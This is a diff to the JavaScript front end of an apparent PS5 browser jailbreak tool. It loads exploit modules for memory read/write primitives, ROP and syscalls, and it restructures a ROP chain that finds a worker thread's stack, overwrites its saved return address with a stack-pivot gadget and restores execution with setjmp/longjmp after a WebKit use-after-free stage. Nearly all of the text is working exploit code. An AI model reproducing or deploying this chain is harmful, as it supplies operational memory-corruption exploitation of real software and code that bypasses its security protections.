@@ -104,7 +104,7 @@ async function loadExploitModules() {
     try {
         const modInt64 = await import('./slopkit-main/slopkit/int64.js');
         int64 = modInt64.int64;
-        
+
         const modCore = await import('./slopkit-main/slopkit/core.js');
         establishPrimitive = modCore.establishPrimitive;
         releaseFakeCell = modCore.releaseFakeCell;
@@ -116,7 +116,7 @@ async function loadExploitModules() {
         restoreCarrier = modCore.restoreCarrier;
         plausibleAddress = modCore.plausibleAddress;
         plausibleCell = modCore.plausibleCell;
-        
+
         const modMem = await import('./slopkit-main/slopkit/mem.js');
         installWindowP = modMem.installWindowP;
         read1 = modMem.read1;
@@ -131,15 +131,15 @@ async function loadExploitModules() {
         readInto = modMem.readInto;
         toI64 = modMem.toI64;
         addrNumber = modMem.addrNumber;
-        
+
         const modRop = await import('./slopkit-main/slopkit/rop.js');
         rop = modRop.rop;
         worker_rop = modRop.worker_rop;
         thread_rop = modRop.thread_rop;
-        
+
         const modSyscalls = await import('./slopkit-main/slopkit/syscalls.js');
         SYS = modSyscalls.SYS;
-        
+
         exploitModulesLoaded = true;
         log("Exploit modules loaded successfully", "log-ok");
     } catch (err) {
@@ -293,8 +293,8 @@ updateHostDisplay();
 if (ipVal) ipVal.addEventListener("click", function() { const val = prompt("Enter PS5 / Target Host LAN IP:", targetHost); if (val !== null) { const trimmed = val.trim(); if (trimmed) { targetHost = trimmed; updateHostDisplay(); try { localStorage.setItem("ps5_target_ip", targetHost); } catch (e) {} } } });
 if (portVal) portVal.addEventListener("click", function() { const val = prompt("Enter Payload Port:", listenerPort); if (val !== null) { const trimmed = val.trim(); if (trimmed) { listenerPort = trimmed; updateHostDisplay(); try { localStorage.setItem("ps5_payload_port", listenerPort); } catch (e) {} } } });
 
-// Firmware detection is now best-effort only. If it can't be parsed we
-// simply fall back to the newest known offset set instead of locking the UI.
+// Firmware detection is best-effort only. If it can't be parsed we fall
+// back to the newest known offset set instead of locking the UI.
 const m = /PlayStation 5[\s\/;](\d+)\.(\d+)/.exec(navigator.userAgent);
 const fw = m ? `${m[1].padStart(2, "0")}.${m[2].padStart(2, "0")}` : null;
 
@@ -303,8 +303,6 @@ let entry = null;
 function fwNum(s) { const p = s.split("."); return parseInt(p[0], 10) * 100 + parseInt(p[1], 10); }
 function nearest(data, target) { const want = fwNum(target); const maj = target.split(".")[0]; let best = null, bestd = 1e9; for (const k in data) { if (k.split(".")[0] !== maj) continue; const d = Math.abs(fwNum(k) - want); if (d < bestd) { bestd = d; best = k; } } return best; }
 
-// The button is unlocked unconditionally - the user is responsible for
-// running this on a supported firmware. No UA / firmware gate.
 function unlockJailbreakButton() {
     jailbreak.classList.remove("disabled");
     renderPayloadList();
@@ -560,7 +558,11 @@ function initROP() {
         return ptr;
     }
 
-    let chain = new worker_rop({ p: {
+    // IMPORTANT: rop.js expects a *flat* wrapper object. It stores the whole
+    // first argument as `this.p` and calls `this.p.malloc(...)`,
+    // `this.p.write8(...)`, `this.p.pre_chain(...)`, `this.p.launch_chain(...)`
+    // directly on it. Do NOT nest the R/W methods under a `p:` key.
+    let chain = new worker_rop({
         write8: p.write8, write4: p.write4, write2: p.write2, write1: p.write1,
         read8: p.read8, read4: p.read4, read2: p.read2, read1: p.read1,
         leakval: p.leakval,
@@ -569,53 +571,55 @@ function initROP() {
         syscalls: syscalls,
         libSceNKWebKitBase: libSceNKWebKitBase,
         libSceLibcInternalBase: libSceLibcInternalBase,
-        libKernelBase: libKernelBase
-    }, pre_chain: (c) => {
-        c.push(gadgets["pop rdi"]);
-        c.push(c.return_value);
-        c.push(libSceLibcInternalBase.add32(offsets.lc_setjmp));
-    }, launch_chain: async (c) => {
-        let worker = new Worker("slopkit-main/slopkit/rop_slave.js?v=final");
-        await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
-        let worker_stack = null;
-        for (let thread = p.read8(libKernelBase.add32(offsets.lk_thread_list)); thread.low != 0 || thread.hi != 0; thread = p.read8(thread.add32(0x38))) {
-            let stack = p.read8(thread.add32(0xA8));
-            let stacksz = p.read8(thread.add32(0xB0));
-            if (stacksz.low == 0x80000) { worker_stack = stack; break; }
+        libKernelBase: libKernelBase,
+        pre_chain: (c) => {
+            c.push(gadgets["pop rdi"]);
+            c.push(c.return_value);
+            c.push(libSceLibcInternalBase.add32(offsets.lc_setjmp));
+        },
+        launch_chain: async (c) => {
+            let worker = new Worker("slopkit-main/slopkit/rop_slave.js?v=final");
+            await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
+            let worker_stack = null;
+            for (let thread = p.read8(libKernelBase.add32(offsets.lk_thread_list)); thread.low != 0 || thread.hi != 0; thread = p.read8(thread.add32(0x38))) {
+                let stack = p.read8(thread.add32(0xA8));
+                let stacksz = p.read8(thread.add32(0xB0));
+                if (stacksz.low == 0x80000) { worker_stack = stack; break; }
+            }
+            if (!worker_stack) throw new Error("worker stack not found");
+
+            let return_address_ptr = await new Promise((resolve, reject) => {
+                const expected = libKernelBase.add32(offsets.lk_worker_wait_return);
+                let attempts = 0;
+                const search = () => {
+                    for (let offset = 0x7F000; offset < 0x80000; offset += 8) {
+                        const candidate = worker_stack.add32(offset);
+                        const value = p.read8(candidate);
+                        if (value.low === expected.low && value.hi === expected.hi) { resolve(candidate); return; }
+                    }
+                    if (++attempts < 50) setTimeout(search, 1);
+                    else reject(new Error("worker return fingerprint not found"));
+                };
+                search();
+            });
+
+            let original_return_address = p.read8(return_address_ptr);
+            let stack_pointer_ptr = return_address_ptr.add32(0x8);
+            let original_context = malloc(0x40);
+
+            c.push_write8(original_context, original_return_address);
+            c.push_write8(original_context.add32(0x10), return_address_ptr);
+            c.push_write8(stack_pointer_ptr, p.read8(stack_pointer_ptr));
+            c.push(gadgets["pop rdi"]); c.push(original_context);
+            c.push(libSceLibcInternalBase.add32(offsets.lc_longjmp));
+
+            if (p.jb && p.jb.hot) log(`Writing retaddr 0x${return_address_ptr.toString()}`, "log-info");
+            p.write8(return_address_ptr, gadgets["pop rsp"]);
+            p.write8(stack_pointer_ptr, c.stack_entry_point);
+
+            await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
         }
-        if (!worker_stack) throw new Error("worker stack not found");
-
-        let return_address_ptr = await new Promise((resolve, reject) => {
-            const expected = libKernelBase.add32(offsets.lk_worker_wait_return);
-            let attempts = 0;
-            const search = () => {
-                for (let offset = 0x7F000; offset < 0x80000; offset += 8) {
-                    const candidate = worker_stack.add32(offset);
-                    const value = p.read8(candidate);
-                    if (value.low === expected.low && value.hi === expected.hi) { resolve(candidate); return; }
-                }
-                if (++attempts < 50) setTimeout(search, 1);
-                else reject(new Error("worker return fingerprint not found"));
-            };
-            search();
-        });
-
-        let original_return_address = p.read8(return_address_ptr);
-        let stack_pointer_ptr = return_address_ptr.add32(0x8);
-        let original_context = malloc(0x40);
-
-        c.push_write8(original_context, original_return_address);
-        c.push_write8(original_context.add32(0x10), return_address_ptr);
-        c.push_write8(stack_pointer_ptr, p.read8(stack_pointer_ptr));
-        c.push(gadgets["pop rdi"]); c.push(original_context);
-        c.push(libSceLibcInternalBase.add32(offsets.lc_longjmp));
-
-        if (p.jb && p.jb.hot) log(`Writing retaddr 0x${return_address_ptr.toString()}`, "log-info");
-        p.write8(return_address_ptr, gadgets["pop rsp"]);
-        p.write8(stack_pointer_ptr, c.stack_entry_point);
-
-        await new Promise(r => { worker.onmessage = r; worker.postMessage(0); });
-    }});
+    });
 
     exploitState.chain = chain;
     return { p, chain, gadgets, syscalls, libSceNKWebKitBase, libSceLibcInternalBase, libKernelBase };
@@ -690,7 +694,7 @@ async function runFullExploitChain() {
     if (!exploitModulesLoaded) {
         throw new Error("Exploit modules not loaded");
     }
-    
+
     exploitState.stage = "webkit_uaf";
     updateStageBadge("webkit_uaf");
     cat.className = "run";
@@ -775,7 +779,7 @@ jailbreak.addEventListener("click", async () => {
             return;
         }
     }
-    
+
     jailbreak.classList.add("disabled", "running");
     await runFullExploitChain();
 });
